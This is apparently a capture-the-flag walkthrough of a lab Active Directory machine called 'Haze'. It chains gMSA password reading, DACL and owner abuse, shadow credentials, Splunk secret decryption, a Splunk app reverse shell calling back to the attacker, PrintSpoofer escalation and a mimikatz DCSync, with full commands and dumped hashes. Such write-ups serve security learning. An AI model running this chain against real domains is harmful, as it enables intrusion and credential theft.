SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
```
- paul and mark has same pass

## enum with paul and mark creds

```
└─$ netexec smb 10.10.11.61 -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute                             
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
SMB         10.10.11.61     445    DC01             498: HAZE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             500: HAZE\Administrator (SidTypeUser)
SMB         10.10.11.61     445    DC01             501: HAZE\Guest (SidTypeUser)
SMB         10.10.11.61     445    DC01             502: HAZE\krbtgt (SidTypeUser)
SMB         10.10.11.61     445    DC01             512: HAZE\Domain Admins (SidTypeGroup)
SMB         10.10.11.61     445    DC01             513: HAZE\Domain Users (SidTypeGroup)
SMB         10.10.11.61     445    DC01             514: HAZE\Domain Guests (SidTypeGroup)
SMB         10.10.11.61     445    DC01             515: HAZE\Domain Computers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             516: HAZE\Domain Controllers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             517: HAZE\Cert Publishers (SidTypeAlias)
SMB         10.10.11.61     445    DC01             518: HAZE\Schema Admins (SidTypeGroup)
SMB         10.10.11.61     445    DC01             519: HAZE\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.61     445    DC01             520: HAZE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.61     445    DC01             521: HAZE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             522: HAZE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             525: HAZE\Protected Users (SidTypeGroup)
SMB         10.10.11.61     445    DC01             526: HAZE\Key Admins (SidTypeGroup)
SMB         10.10.11.61     445    DC01             527: HAZE\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.61     445    DC01             553: HAZE\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.61     445    DC01             571: HAZE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.61     445    DC01             572: HAZE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.61     445    DC01             1000: HAZE\DC01$ (SidTypeUser)
SMB         10.10.11.61     445    DC01             1101: HAZE\DnsAdmins (SidTypeAlias)
SMB         10.10.11.61     445    DC01             1102: HAZE\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.61     445    DC01             1103: HAZE\paul.taylor (SidTypeUser)
SMB         10.10.11.61     445    DC01             1104: HAZE\mark.adams (SidTypeUser)
SMB         10.10.11.61     445    DC01             1105: HAZE\edward.martin (SidTypeUser)
SMB         10.10.11.61     445    DC01             1106: HAZE\alexander.green (SidTypeUser)
SMB         10.10.11.61     445    DC01             1107: HAZE\gMSA_Managers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             1108: HAZE\Splunk_Admins (SidTypeGroup)
SMB         10.10.11.61     445    DC01             1109: HAZE\Backup_Reviewers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             1110: HAZE\Splunk_LDAP_Auth (SidTypeGroup)
SMB         10.10.11.61     445    DC01             1111: HAZE\Haze-IT-Backup$ (	)
SMB         10.10.11.61     445    DC01             1112: HAZE\Support_Services (SidTypeGroup)
```

```
Administrator
Guest
krbtgt
DC01$
paul.taylor
mark.adams
edward.martin
alexander.green
Haze-IT-Backup$
```


### bloodhound data there is nothing very useful

```
- paul.taylor ---> no outbound info

- mark.adams ---> no outbound info

- edward.martin not appear

- alexander.green ---> member of Splunk_Admins ---> no outbound info

- Haze-IT-Backup$ (service acct) ---> has WriteOwner over ---> Support_Services group
```

- mark.adams has member of gMSA_Managers and Remote Management Users
```
└─$ netexec ldap 10.10.11.61 -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' --query "(sAMAccountName=mark.adams)" ""
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.61     389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
LDAP        10.10.11.61     389    DC01             [+] Response for object: CN=Mark Adams,CN=Users,DC=haze,DC=htb
LDAP        10.10.11.61     389    DC01             objectClass:         top person organizationalPerson user
LDAP        10.10.11.61     389    DC01             cn:                  Mark Adams
LDAP        10.10.11.61     389    DC01             distinguishedName:   CN=Mark Adams,CN=Users,DC=haze,DC=htb
LDAP        10.10.11.61     389    DC01             instanceType:        4
LDAP        10.10.11.61     389    DC01             whenCreated:         20250305072118.0Z
LDAP        10.10.11.61     389    DC01             whenChanged:         20250405010734.0Z
LDAP        10.10.11.61     389    DC01             uSNCreated:          12877
LDAP        10.10.11.61     389    DC01             memberOf:            CN=gMSA_Managers,CN=Users,DC=haze,DC=htb CN=Remote Management Users,CN=Builtin,DC=haze,DC=htb
LDAP        10.10.11.61     389    DC01             uSNChanged:          127194
LDAP        10.10.11.61     389    DC01             name:                Mark Adams
LDAP        10.10.11.61     389    DC01             objectGUID:          0x613b5f7798a31e44b2dc450da5936fcd
LDAP        10.10.11.61     389    DC01             userAccountControl:  66048
LDAP        10.10.11.61     389    DC01             badPwdCount:         0
LDAP        10.10.11.61     389    DC01             codePage:            0
LDAP        10.10.11.61     389    DC01             countryCode:         0
LDAP        10.10.11.61     389    DC01             badPasswordTime:     0
LDAP        10.10.11.61     389    DC01             lastLogoff:          0
LDAP        10.10.11.61     389    DC01             lastLogon:           133857078823159294
LDAP        10.10.11.61     389    DC01             pwdLastSet:          133882888543202907
LDAP        10.10.11.61     389    DC01             primaryGroupID:      513
LDAP        10.10.11.61     389    DC01             objectSid:           0x010500000000000515000000bad042139a2cb50193a4298d50040000
LDAP        10.10.11.61     389    DC01             accountExpires:      9223372036854775807
LDAP        10.10.11.61     389    DC01             logonCount:          5
LDAP        10.10.11.61     389    DC01             sAMAccountName:      mark.adams
LDAP        10.10.11.61     389    DC01             sAMAccountType:      805306368
LDAP        10.10.11.61     389    DC01             userPrincipalName:   mark.adams@haze.htb
LDAP        10.10.11.61     389    DC01             objectCategory:      CN=Person,CN=Schema,CN=Configuration,DC=haze,DC=htb
LDAP        10.10.11.61     389    DC01             dSCorePropagationData: 20250305080806.0Z 20250305080445.0Z 20250305072314.0Z 16010101000000.0Z
LDAP        10.10.11.61     389    DC01             lastLogonTimestamp:  133882871693656436
```


## shell as mark.adams

```
*Evil-WinRM* PS C:\Users\mark.adams\Documents> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== ===========================================
haze\mark.adams S-1-5-21-323145914-28650650-2368316563-1104


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                         Attributes
=========================================== ================ =========================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
HAZE\gMSA_Managers                          Group            S-1-5-21-323145914-28650650-2368316563-1107 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
```

```
ObjectDN                : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : 888eedd6-ce04-df40-b462-b8a50e41ba38
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-323145914-28650650-2368316563-1107
IdentityReferenceName   : gMSA_Managers
IdentityReferenceDomain : haze.htb
IdentityReferenceDN     : CN=gMSA_Managers,CN=Users,DC=haze,DC=htb
IdentityReferenceClass  : group

ObjectDN                : CN=Support_Services,CN=Users,DC=haze,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteOwner
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-323145914-28650650-2368316563-1111
IdentityReferenceName   : Haze-IT-Backup$
IdentityReferenceDomain : haze.htb
IdentityReferenceDN     : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
IdentityReferenceClass  : computer
```


#### GMSA abuse

- mark.adams has member of gMSA_Managers but is not allowed to pull clean text gmsa pass (can modify gmsa objects???). 
- Haze-IT-Backup is a service account and has WriteProperty over group gMSA_Managers.

- confirmed, members of gMSA_Managers has writeproperty over gmsa account.
```
ObjectDN                : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : 888eedd6-ce04-df40-b462-b8a50e41ba38
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-323145914-28650650-2368316563-1107
IdentityReferenceName   : gMSA_Managers
IdentityReferenceDomain : haze.htb
IdentityReferenceDN     : CN=gMSA_Managers,CN=Users,DC=haze,DC=htb
IdentityReferenceClass  : group
```

- https://medium.com/@offsecdeer/attacking-group-managed-service-accounts-gmsa-5e9c54c56e49
- https://adsecurity.org/?p=4367

- allow user to read gmsa password
- https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/getting-started-with-group-managed-service-accounts#add-member-hosts-using-powershell
- https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-adserviceaccount?view=windowsserver2025-ps#example-3-set-the-principals-allowed-to-retrieve-the-password-for-an-msa

```PS C:\> Set-ADServiceAccount -Identity Service1 -PrincipalsAllowedToRetrieveManagedPassword "MsaAdmins.corp.contoso.com"```


```Set-ADServiceAccount -Identity 'Haze-IT-Backup$' -PrincipalsAllowedToRetrieveManagedPassword mark.adams```

- read gmsa passwords
```
└─$ netexec ldap 10.10.11.61 -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.61     636    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
LDAPS       10.10.11.61     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.61     636    DC01             Account: Haze-IT-Backup$      NTLM: a70df6599d5eab1502b38f9c1c3fd828
```

## BH data collect with Haze-IT-Backup$ creds

```
- Haze-IT-Backup$ ---> has WriteOwner over ---> Support_Services group

- edward.martin ---> member of ---> Backup_Reviewers and Remote Management Users

- Support_Services group ---> has AddKeyCredentialLink and ForceChangePassword over ---> edward.martin
```

- https://bloodhound.specterops.io/resources/edges/add-key-credential-link
- https://bloodhound.specterops.io/resources/edges/write-owner


### WriteOwner over Support_Services abuse

- https://www.hackingarticles.in/abusing-ad-dacl-writeowner/
- https://www.thehacker.recipes/ad/movement/dacl/addmember

- bh explore path
```
To abuse ownership of a user object, you may grant yourself the AddMember permission. This can be accomplished using the Add-DomainObjectAcl function in PowerView.

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers

You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember.

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred

Get-DomainGroupMember -Identity 'Domain Admins'
```


```
└─$ impacket-owneredit -action write -new-owner 'Haze-IT-Backup$' -target-dn 'CN=Support_Services,CN=Users,DC=haze,DC=htb' 'haze.htb/Haze-IT-Backup$' -hashes :a70df6599d5eab1502b38f9c1c3fd828 -dc-ip 10.10.11.61

[*] Current owner information below
[*] - SID: S-1-5-21-323145914-28650650-2368316563-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=haze,DC=htb
[*] OwnerSid modified successfully!
```

```
└─$ impacket-dacledit -action write -rights 'WriteMembers' -principal 'Haze-IT-Backup$' -target-dn 'CN=Support_Services,CN=Users,DC=haze,DC=htb' 'haze.htb/Haze-IT-Backup$' -hashes :a70df6599d5eab1502b38f9c1c3fd828 -dc-ip 10.10.11.61

[*] DACL backed up to dacledit-20250406-011526.bak
[*] DACL modified successfully!
```

```
└─$ pth-net rpc group addmem 'Support_Services' 'Haze-IT-Backup$' -U 'haze.htb'/'Haze-IT-Backup$'%'ffffffffffffffffffffffffffffffff':'a70df6599d5eab1502b38f9c1c3fd828' -S 10.10.11.61
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
```

- after edit rights/acl
```
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "Haze-IT-Backup"}


ObjectDN                : CN=Support_Services,CN=Users,DC=haze,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ReadProperty, WriteProperty
ObjectAceType           : Self-Membership
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-323145914-28650650-2368316563-1111
IdentityReferenceName   : Haze-IT-Backup$
IdentityReferenceDomain : haze.htb
IdentityReferenceDN     : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
IdentityReferenceClass  : computer
```
### Shadow creds abuse ()

- after explore WriteOwner the svc acct Haze-IT-Backup$ has all rights to abuse edward.martin acct with AddKeyCredentialLink and ForceChangePassword

- https://github.com/ShutdownRepo/pywhisker?tab=readme-ov-file#add-new-values
- https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials#shadow-credentials

```
└─$ python3 pywhisker.py -d haze.htb -u 'Haze-IT-Backup$' -H :a70df6599d5eab1502b38f9c1c3fd828 --target edward.martin --action add --filename test1

[*] Searching for the target account
[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: c3fcb231-1d35-2676-b6eb-7b0ac8075f03
[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: test1.pfx
[+] PFX exportiert nach: test1.pfx
[i] Passwort für PFX: lRwouXVW4yES0AHekDMv
[+] Saved PFX (#PKCS12) certificate & key at path: test1.pfx
[*] Must be used with password: lRwouXVW4yES0AHekDMv
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

- to use PKINITools i have problems with clock ad server
```
minikerberos.protocol.errors.KerberosError:  Error Name: KRB_AP_ERR_SKEW Detail: "The clock skew is too great" 
```

- ad server is eight hours ahead
```
└─$ ntpdate -q 10.10.11.61                                                                                                                                     
2025-04-08 08:08:22.133294 (-0400) +28935.728992 +/- 0.073796 10.10.11.61 s1 no-leap
```

```
└─$ faketime -f +8hr python3 gettgtpkinit.py -cert-pfx ../pywhisker/pywhisker/test1.pfx -pfx-pass lRwouXVW4yES0AHekDMv haze.htb/edward.martin edward.ccache


2025-04-08 08:06:50,946 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-04-08 08:06:50,988 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-08 08:06:51,329 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-08 08:06:51,329 minikerberos INFO     419e64a853619fe283622fe59e8cff7b06c3604d76cf62d37388d44e94c6724c
INFO:minikerberos:419e64a853619fe283622fe59e8cff7b06c3604d76cf62d37388d44e94c6724c
2025-04-08 08:06:51,335 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

```
└─$ export KRB5CCNAME=edward.ccache                                   
```

```
└─$ faketime -f +8hr python3 getnthash.py -key 419e64a853619fe283622fe59e8cff7b06c3604d76cf62d37388d44e94c6724c haze.htb/edward.martin
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

## logged with edward.martin 

```
*Evil-WinRM* PS C:\Backups\Splunk> download splunk_backup_2024-08-06.zip
```

```
└─$ grep -r password Splunk 

Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
```

- to decrypt last password use splunk secret key in unzipped file Splunk/etc/auth/splunk.secret with splunksecrets

- https://github.com/HurricaneLabs/splunksecretss

```
└─$ splunksecrets splunk-legacy-decrypt -S Splunk/etc/auth/splunk.secret --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI=' 

Sp1unkadmin@2k24
```

## upload rev shell in splunk admin panel

- https://www.n00py.io/2018/10/popping-shells-on-splunk/
- https://github.com/0xjpuff/reverse_shell_splunk


- 1 - edit run.ps1 adding attacker IP and PORT
- 2 - tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk
- 3 - mv reverse_shell_splunk.tgz reverse_shell_splunk.spl
- 4 - start rev shel listner
- 5 - upload .spl file in install app page


```
msf6 exploit(multi/handler) > run 
[*] Started reverse TCP handler on 10.10.14.58:1234 
[*] Command shell session 1 opened (10.10.14.58:1234 -> 10.10.11.61:54535) at 2025-04-08 01:42:45 -0400

PS C:\Windows\system32> whoami
haze\alexander.green
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name            SID                                        
==================== ===========================================
haze\alexander.green S-1-5-21-323145914-28650650-2368316563-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                         Attributes                                        
========================================== ================ =========================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                     Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                     Mandatory group, Enabled by default, Enabled group
HAZE\Splunk_Admins                         Group            S-1-5-21-323145914-28650650-2368316563-1108 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                  


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------
```

## SeImpersonatePrivilege abuse

- https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeImpersonatePrivilege.md
- https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070 


- 1 - upload printspoofer 
- 2 - upload secundary shell file
- 3 - and execute as system .\PrintSpoofer.exe -c ".\xeu.exe"

```
PS C:\Users\alexander.green\Documents> .\PrintSpoofer.exe -c ".\xeu.exe"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
[+] CreateProcessWithTokenW() OK
PS C:\Users\alexander.green\Documents> [*] Sending stage (177734 bytes) to 10.10.11.61
[*] Meterpreter session 12 opened (10.10.14.58:1234 -> 10.10.11.61:52376) at 2025-04-08 14:17:25 -0400
sess

[*] 10.10.11.61 - Command shell session 11 closed.  Reason: User exit
msf6 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information        Connection
  --  ----  ----                     -----------        ----------
  12        meterpreter x86/windows  HAZE\DC01$ @ DC01  10.10.14.58:1234 -> 10.10.11.61:52376 (10.10.11.61)

msf6 exploit(multi/handler) > sessions 12
[*] Starting interaction with 12...

meterpreter > getuid 
Server username: HAZE\DC01$
```

```
C:\Users>whoami /all
whoami /all

USER INFORMATION
----------------

User Name  SID     
========== ========
haze\dc01$ S-1-5-18


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                         Attributes                                                     
=========================================== ================ =========================================== ===============================================================
BUILTIN\Administrators                      Alias            S-1-5-32-544                                Enabled by default, Enabled group, Group owner                 
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group             
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group             
BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group             
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group             
BUILTIN\Windows Authorization Access Group  Alias            S-1-5-32-560                                Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group             
HAZE\DC01$                                  User             S-1-5-21-323145914-28650650-2368316563-1000 Mandatory group, Enabled by default, Enabled group             
HAZE\Domain Controllers                     Group            S-1-5-21-323145914-28650650-2368316563-516  Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS  Well-known group S-1-5-9                                     Mandatory group, Enabled by default, Enabled group             
Authentication authority asserted identity  Well-known group S-1-18-1                                    Mandatory group, Enabled by default, Enabled group             
HAZE\Denied RODC Password Replication Group Alias            S-1-5-21-323145914-28650650-2368316563-572  Mandatory group, Enabled by default, Enabled group, Local Group
HAZE\Cert Publishers                        Alias            S-1-5-21-323145914-28650650-2368316563-517  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\System Mandatory Level      Label            S-1-16-16384                                                                                               


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

```
C:\Users\Administrator\Documents>.\mimikatz.exe "lsadump::dcsync /all" exit

...

** SAM ACCOUNT **

SAM Username         : krbtgt
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 937e28202a6cdfcc556d1b677bcbe82c

Object RDN           : Domain Controllers

** SAM ACCOUNT **

SAM Username         : Domain Controllers
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-516
Object Relative ID   : 516

Credentials:

Object RDN           : Read-only Domain Controllers

** SAM ACCOUNT **

SAM Username         : Read-only Domain Controllers
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-521
Object Relative ID   : 521

Credentials:

Object RDN           : Splunk_Admins

** SAM ACCOUNT **

SAM Username         : Splunk_Admins
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-1108
Object Relative ID   : 1108

Credentials:

Object RDN           : Backup_Reviewers

** SAM ACCOUNT **

SAM Username         : Backup_Reviewers
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-1109
Object Relative ID   : 1109

Credentials:

Object RDN           : gMSA_Managers

** SAM ACCOUNT **

SAM Username         : gMSA_Managers
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-1107
Object Relative ID   : 1107

Credentials:

Object RDN           : {6AC1786C-016F-11D2-945F-00C04fB984F9}


Object RDN           : Splunk_LDAP_Auth

** SAM ACCOUNT **

SAM Username         : Splunk_LDAP_Auth
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-1110
Object Relative ID   : 1110

Credentials:

Object RDN           : Users


Object RDN           : Configuration


Object RDN           : DomainDnsZones


Object RDN           : ForestDnsZones


Object RDN           : Remote Management Users

** SAM ACCOUNT **

SAM Username         : Remote Management Users
Object Security ID   : S-1-5-32-580
Object Relative ID   : 580

Credentials:

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 06dc954d32cb91ac2831d67e3e12027f

Object RDN           : RID Manager$


Object RDN           : RID Set


Object RDN           : DC01

** SAM ACCOUNT **

SAM Username         : DC01$
User Account Control : 00082000 ( SERVER_TRUST_ACCOUNT TRUSTED_FOR_DELEGATION )
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-1000
Object Relative ID   : 1000

Credentials:
  Hash NTLM: 9dcbc33adec3bdc8b2334060002ce1b4

Object RDN           : Haze-IT-Backup

** SAM ACCOUNT **

SAM Username         : Haze-IT-Backup$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-1111
Object Relative ID   : 1111

Credentials:
  Hash NTLM: a70df6599d5eab1502b38f9c1c3fd828

Object RDN           : Support_Services

** SAM ACCOUNT **

SAM Username         : Support_Services
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-1112
Object Relative ID   : 1112

Credentials:

Object RDN           : Paul Taylor

** SAM ACCOUNT **

SAM Username         : paul.taylor
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-1103
Object Relative ID   : 1103

Credentials:
  Hash NTLM: e90878e2fb0a21a11859ff60f1119fb4

Object RDN           : Mark Adams

** SAM ACCOUNT **

SAM Username         : mark.adams
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-1104
Object Relative ID   : 1104

Credentials:
  Hash NTLM: e90878e2fb0a21a11859ff60f1119fb4

Object RDN           : Edward Martin

** SAM ACCOUNT **

SAM Username         : edward.martin
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-1105
Object Relative ID   : 1105

Credentials:
  Hash NTLM: 09e0b3eeb2e7a6b0d419e9ff8f4d91af

Object RDN           : Alexander Green

** SAM ACCOUNT **

SAM Username         : alexander.green
